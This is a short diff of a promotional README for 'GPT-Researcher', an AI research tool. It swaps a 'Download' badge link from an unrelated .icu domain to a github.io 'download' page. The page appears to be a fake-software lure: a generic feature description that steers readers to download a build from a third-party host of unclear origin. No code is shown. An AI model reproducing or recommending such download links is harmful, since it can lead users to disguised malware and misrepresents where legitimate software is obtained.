@@ -1,6 +1,6 @@
 **GPT-Researcher** is an advanced AI tool designed to assist researchers by providing relevant information, summarizing academic papers, generating insights, and helping with the overall research process. It uses the capabilities of GPT models to analyze vast amounts of data, identify key concepts, and summarize findings, significantly speeding up research workflows. Whether it's for academic papers, literature reviews, or exploring new topics, GPT-Researcher can support researchers by offering quick and accurate summaries, data extraction, and content generation.
 
-[![Download GPT researcher](https://img.shields.io/badge/Download-GPTresearcher%20-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9)
+[![Download GPT researcher](https://img.shields.io/badge/Download-GPTresearcher%20-blueviolet)](https://gpt-researcher-download.github.io/.github/)
 
 **Key Features of GPT-Researcher:**
 - **Academic Paper Summarization:** GPT-Researcher can quickly summarize research papers, articles, and academic literature, helping researchers save time when reviewing large amounts of text.
